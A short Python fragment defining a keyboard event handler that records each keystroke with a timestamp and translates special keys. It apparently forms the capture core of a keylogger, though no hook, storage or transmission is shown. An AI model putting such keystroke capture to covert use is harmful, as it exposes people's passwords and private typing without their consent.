
from datetime import datetime

details_keys = []
translat_key = {'space': ' ', 'enter': '\n', 'tab': '\t', 'caps lock': ''}

def on_key(e):
    key_value = " "
    human_time = datetime.fromtimestamp(e.time).strftime('%Y-%m-%d %H:%M')
    if e.name == 'backspace':
        if details_keys:
            details_keys.pop()
            return details_keys
    key_value = translat_key.get(e.name, e.name)
    details_keys.append({human_time: key_value})
    return details_keys

